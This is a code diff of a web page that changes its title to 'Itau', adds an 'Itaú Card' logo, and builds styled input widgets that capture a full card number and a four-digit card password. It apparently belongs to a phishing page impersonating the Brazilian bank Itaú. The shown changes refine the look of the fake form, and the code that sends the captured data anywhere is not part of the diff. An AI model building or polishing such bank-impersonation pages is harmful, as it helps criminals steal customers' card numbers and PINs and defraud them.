@@ -3,27 +3,34 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Cartão</title>
+  <title>Itau</title>
   <style>
     body {
       margin: 0;
       padding: 0;
-       background: url('foto/fundo.JPEG') no-repeat center center fixed;
+      background: url('./foto/fundo8.JPG') no-repeat center center fixed;
       background-size: cover;
       font-family: Arial, sans-serif;
+    }
+
+    .logo-itau {
+      position: absolute;
+      top: 20px;
+      left: 10px;
+      height: 70px; /* Equivalente a h-12 (considerando 1rem = 4px) */
     }
 
     .container {
       position: absolute;
       bottom: 100px;
-      width: calc(100% - 40px); /* Afasta das laterais */
+      width: calc(100% - 40px);
       left: 50%;
       transform: translateX(-50%);
       background-color: #0031d3;
       padding: 20px;
       box-sizing: border-box;
-      border-radius: 20px; /* Arredondado em todas as bordas */
-      max-width: 500px; /* Limita a largura máxima */
+      border-radius: 20px;
+      max-width: 500px;
     }
 
     .label {
@@ -32,14 +39,35 @@
       margin-bottom: 5px;
     }
 
-    .input-cartao {
-      width: 100%;
+    .cartao-container {
+      display: flex;
+      background-color: white;
       padding: 10px;
-      font-size: 18px;
-      border: none;
       border-radius: 5px;
       margin-bottom: 20px;
-      box-sizing: border-box;
+      cursor: pointer;
+    }
+
+    .cartao-numeros {
+      flex-grow: 1;
+      display: flex;
+      gap: 10px;
+    }
+
+    .grupo-numero {
+      width: 40px;
+      height: 20px;
+      text-align: center;
+      font-size: 18px;
+      opacity: 0;
+    }
+
+    .grupo-numero.ativo {
+      opacity: 0.3;
+    }
+
+    .grupo-numero.preenchido {
+      opacity: 1;
     }
 
     .senha-container {
@@ -64,7 +92,7 @@
       border-radius: 50%;
       background-color: black;
       opacity: 0;
-      transition: opacity 0.2s; /* Suaviza a transição */
+      transition: opacity 0.2s;
     }
 
     .circulo.ativo {
@@ -94,7 +122,7 @@
       cursor: pointer;
     }
 
-    input[type="password"] {
+    input[type="password"], input[type="text"] {
       opacity: 0;
       position: absolute;
       pointer-events: none;
@@ -103,9 +131,20 @@
 </head>
 <body>
 
+  <!-- Adicionei a logo do Itaú aqui -->
+  <img src="foto/itaucard.png" alt="Itaú Card" class="logo-itau">
+
   <div class="container">
     <div class="label">Número do cartão</div>
-    <input type="text" maxlength="19" class="input-cartao" id="cartao" placeholder="5555 5555 5555 5555">
+    <div class="cartao-container" id="cartaoContainer">
+      <div class="cartao-numeros">
+        <div class="grupo-numero" id="group1"></div>
+        <div class="grupo-numero" id="group2"></div>
+        <div class="grupo-numero" id="group3"></div>
+        <div class="grupo-numero" id="group4"></div>
+      </div>
+    </div>
+    <input type="text" maxlength="19" id="cartao" placeholder="5555 5555 5555 5555">
 
     <div class="label">Senha do cartão</div>
     <div class="senha-container" id="senhaContainer">
@@ -124,14 +163,17 @@
   </div>
 
   <script>
-    // Formata o número do cartão ao digitar
-    document.getElementById('cartao').addEventListener('input', function(e) {
-      let valor = e.target.value.replace(/\D/g, '').substring(0, 16);
-      let formatado = valor.replace(/(\d{4})(?=\d)/g, '$1 ');
-      e.target.value = formatado;
-    });
+    // Elementos do cartão
+    const cartaoInput = document.getElementById('cartao');
+    const cartaoContainer = document.getElementById('cartaoContainer');
+    const groups = [
+      document.getElementById('group1'),
+      document.getElementById('group2'),
+      document.getElementById('group3'),
+      document.getElementById('group4')
+    ];
 
-    // Mostra os pontos da senha conforme digita
+    // Elementos da senha
     const senhaInput = document.getElementById('senha');
     const senhaContainer = document.getElementById('senhaContainer');
     const dots = [
@@ -141,20 +183,51 @@
       document.getElementById('dot4')
     ];
 
-    // Mostra os círculos apenas quando clicar no container
-    senhaContainer.addEventListener('click', () => {
-      // Mostra todos os círculos (transparentes inicialmente)
-      dots.forEach(dot => {
-        dot.classList.add('ativo');
-        dot.classList.remove('preenchido');
-      });
+    // Formata o número do cartão ao digitar
+    cartaoInput.addEventListener('input', function(e) {
+      let valor = e.target.value.replace(/\D/g, '').substring(0, 16);
+      let formatado = valor.replace(/(\d{4})(?=\d)/g, '$1 ');
+      e.target.value = formatado;
       
-      // Foca no campo de senha
-      senhaInput.focus();
+      // Atualiza os grupos de números
+      const numeros = valor.match(/.{1,4}/g) || [];
+      groups.forEach((group, index) => {
+        if (index < numeros.length) {
+          group.textContent = numeros[index];
+          group.classList.add('ativo', 'preenchido');
+        } else {
+          group.textContent = '';
+          group.classList.remove('preenchido');
+          if (document.activeElement === cartaoInput) {
+            group.classList.add('ativo');
+          } else {
+            group.classList.remove('ativo');
+          }
+        }
+      });
     });
 
-    // Atualiza os pontos conforme digita
-    senhaInput.addEventListener('input', function () {
+    // Mostra os grupos do cartão quando clicar
+    cartaoContainer.addEventListener('click', () => {
+      groups.forEach(group => {
+        group.classList.add('ativo');
+      });
+      cartaoInput.focus();
+    });
+
+    // Esconde os grupos do cartão quando clicar fora
+    document.addEventListener('click', function(e) {
+      if (!cartaoContainer.contains(e.target) && e.target !== cartaoInput) {
+        if (cartaoInput.value.length === 0) {
+          groups.forEach(group => {
+            group.classList.remove('ativo', 'preenchido');
+          });
+        }
+      }
+    });
+
+    // Mostra os pontos da senha conforme digita
+    senhaInput.addEventListener('input', function() {
       const valor = senhaInput.value;
       dots.forEach((dot, index) => {
         if (index < valor.length) {
@@ -165,13 +238,20 @@
       });
     });
 
-    // Esconde os pontos quando clicar fora
+    // Mostra os círculos da senha quando clicar
+    senhaContainer.addEventListener('click', () => {
+      dots.forEach(dot => {
+        dot.classList.add('ativo');
+      });
+      senhaInput.focus();
+    });
+
+    // Esconde os círculos da senha quando clicar fora
     document.addEventListener('click', function(e) {
-      if (!senhaContainer.contains(e.target) && e.target !== senhaInput) {
+      if (!senhaContainer.contains(e.target)) {
         if (senhaInput.value.length === 0) {
           dots.forEach(dot => {
-            dot.classList.remove('ativo');
-            dot.classList.remove('preenchido');
+            dot.classList.remove('ativo', 'preenchido');
           });
         }
       }
